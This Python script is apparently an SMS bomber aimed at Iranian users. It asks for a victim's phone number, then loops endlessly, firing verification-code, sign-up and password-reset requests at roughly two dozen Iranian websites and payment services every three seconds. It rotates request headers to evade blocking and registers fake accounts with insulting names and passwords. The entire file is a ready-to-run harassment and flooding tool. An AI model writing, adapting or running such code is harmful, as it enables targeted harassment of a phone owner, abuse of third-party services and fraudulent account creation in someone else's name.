import requests
import time
from head import headers
import Design
import random
import colorama
from colorama import Fore


print(Fore.LIGHTGREEN_EX + Design.DesignText)
print(Fore.LIGHTGREEN_EX + Design.DesignMe)
print(Fore.LIGHTYELLOW_EX + Design.TextWarning)


number = input( Fore.LIGHTBLUE_EX + Design.TextStart )

# https://divar.ir/
url_divar = "https://api.divar.ir/v5/auth/authenticate"
payload_divar = {"phone":number}

# https://www.sheypoor.com/
url_sheypor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
payload_sheypor = {"username": number}

# https://entrepreneurshipisland.com/
url_shipland = "https://entrepreneurshipisland.com/Default.aspx/SendValidationCode"
payload_shipland = {"Phone": number}

#https://appeto.ir/
url_pepeto_forgot = "https://panel.appeto.ir/doForgot"
payload_pepeto_forgot = {"email": "0" + number}
url_pepeto_signup = "https://panel.appeto.ir/doSignup"
payload_pepeto_signup = {"email": "0" + number, "password": "fyouall12#"}

# https://next.zarinpal.com
zarin = "https://next.zarinpal.com/api/oauth/initialize"
zarin_req = {"username": "0" + number}

#https://www.payping.ir
payping = "https://api.payping.ir/v1/user/Register"
paypungReq = {"isOfficialSubmited": False, "panelType": "0", "password": "Boekwfjiewjfij12", "phoneNumber": "0" + number ,"referralCode":"" , "repeatPassword": "Boekwfjiewjfij12", "username":"dsdsddsdsfregere"}

#https://my.paystar.ir/
paystar = "https://core.paystar.ir/api/register"
paystarReq = {"agree":True , "com_name_fa":"", "first_name":"اصغر", "last_name": "ریاضی" , "password":"Youareidiot@1" ,"phone": "0" + number, "referer_id":"null", "user_type":"1"}
forgot_paystar = "https://core.paystar.ir/api/send-forget-pass-code"
forgot_paystar_req = {"phone": "0"+ number}

# https://www.dalfak.com/
dalfak = "https://www.dalfak.com/api/auth/sendVerificationCode"
dalfak_req = { "value": "0"+ number, "type": 1 }

#http://namlik.me/#
namlik = "http://podcaster.namlik.me//api/web/register2"
namlik_req = {"username" : "0" + number, "username_type": "mobile"}

#https://bookapo.com/
bookapo = "https://apiv2.bookapo.com/auth/signup"
bookapo_req = {"mobile":"98" + number, "name":"fyouAllHaha", "password":"Iwillfyou12"}
bookapo_resend = "https://apiv2.bookapo.com/auth/verify/resend/sms"
bookapo_resend_req = {"mobile":"98" + number}

# https://www.salamcinama.ir
salam = "https://api.salamcinama.ir/share/v3/registration/mobile.json"
salam_req = json={"mobile_number":"0" + number, "name":"Susano", "signup_from":"vote"}
salam_resend = "https://api.salamcinama.ir/verification/mobiles.json"
salam_resend_req = json={"mobile_number":"0" + number}

# https://oteacher.org
ote = "https://api.oteacher.org/v1/otp"
ote_req = {"isLogin":False, "isUpdatePhone":False, "phone":"+98"+number}

# https://www.khanoumi.com
kanomi = "https://www.khanoumi.com/accounts/sendotp"
kanomi_req = {"mobile":"0"+number, "redirectUrl":"/"}

# https://web.gap.im/
Gap = "https://core.gap.im/v1/user/add.json?mobile=+98" + number

# https://tradicoders.ir/
Taradi = "https://tradicoders.ir/sms.php?mode=send_authentication&tmobile=0"+ number + "&special=به تریدی کدرز خوش آمدید"

# https://user.telewebion.com
Tlw = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
Tlw_Req = {"code":"98", "phone":number, "smsStatus":"default"}
Tlw_Req_Resend = {"code":"98", "phone":number, "smsStatus":"resend"}

Namava = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
Namav_Req = { "UserName":"+98" + number}

Aio = "https://api.aionet.ir/v4/auth/otp"
Aio_Req = { "mobile":"0" + number}

# https://plan.ir
Plan = "https://plan.upera.tv/api/v1/login/send-code"
Plan_Req = { "mobile":"0" + number}

# https://hamgardi.com
Hamqardi = "https://hamgardi.com/fa/Account/PhoneGenerateCode"
Hamqardi_Req = {"phonenumber":"+98" + number}

#20



while True:
    randomHead = random.choice(headers)
    req = requests.post(url=url_divar, json=payload_divar , headers=randomHead)
    print(req)

    req1 = requests.post(url=url_sheypor, json=payload_sheypor , headers=randomHead)
    print(req1)

    req2 = requests.post(url=url_shipland, json=payload_shipland, headers=randomHead)
    print(req2)

    Pepeto_Forgot = requests.post(url=url_pepeto_forgot, json=payload_pepeto_forgot, headers=randomHead)
    print("Pepeto Forgot: ", Pepeto_Forgot)
    Pepeto_Register = requests.post(url=url_pepeto_signup, json=payload_pepeto_signup, headers=randomHead)
    print("Pepeto resiter: ", Pepeto_Register)

    ZarinRes = requests.post(url=zarin, json=zarin_req, headers=randomHead)
    print(ZarinRes)

    paypingRes = requests.post(url=payping, json=paypungReq, headers=randomHead)
    print(paypingRes)

    paystarRes = requests.post(url=paystar, json=paystarReq, headers=randomHead)
    print(paystarRes)
    paystarResForgot = requests.post(url=forgot_paystar, json=forgot_paystar_req, headers=randomHead)
    print(paystarResForgot)

    dalfakRes = requests.post(url=dalfak, json=dalfak_req, headers=randomHead)
    print(dalfakRes)

    namlikRes = requests.post(url=namlik, json=namlik_req, headers=randomHead)
    print(namlikRes)

    bookapoRes = requests.post(url=bookapo, json=bookapo_req, headers=randomHead)
    print(bookapoRes)
    bookapoRenendRes = requests.post(url=bookapo_resend, json=bookapo_resend_req, headers=randomHead)
    print(bookapoRenendRes)

    salamRes = requests.post(url=salam,
                            json=salam_req,
                            headers=randomHead)
    print(salamRes)
    salamRes_resend = requests.post(url=salam_resend,
                             json=salam_resend_req,
                             headers=randomHead)
    print(salamRes_resend)

    OteRes = requests.post(url=ote, json=ote_req, headers=randomHead)
    print(OteRes)

    kanomiRes = requests.post(url=kanomi, json=kanomi_req, headers=randomHead)
    print(kanomiRes)

    GapRes = requests.get(url=Gap, headers=randomHead)
    print(GapRes)

    # --------------------Onlu One Minutes ---------------

    TlwRes = requests.post(url=Tlw, json=Tlw_Req, headers=randomHead)
    print(TlwRes)
    TlwRes_resend = requests.post(url=Tlw, json=Tlw_Req_Resend, headers=randomHead)
    print(TlwRes_resend)

    NamavRes = requests.post(url=Namava, json=Namav_Req, headers=randomHead)
    print(NamavRes)

    # --------------------Onlu One Minutes ---------------

    AioRes = requests.post(url=Aio, json=Aio_Req, headers=randomHead)
    print(AioRes)

    PlanRes = requests.post(url=Plan, json=Plan_Req, headers=randomHead)
    print(PlanRes)

    HamqardiRes = requests.post(url=Hamqardi, json=Hamqardi_Req, headers=randomHead)
    print(HamqardiRes)

    TestRes = requests.post(url="https://api.karnaval.ir/graphql", json={"variables":{"isSecondAttempt":False, "phone":"0" + number}}, headers=randomHead)
    print(TestRes)

    TestRes = requests.get(url=Taradi, headers=randomHead)
    print(TestRes)



    time.sleep(3)

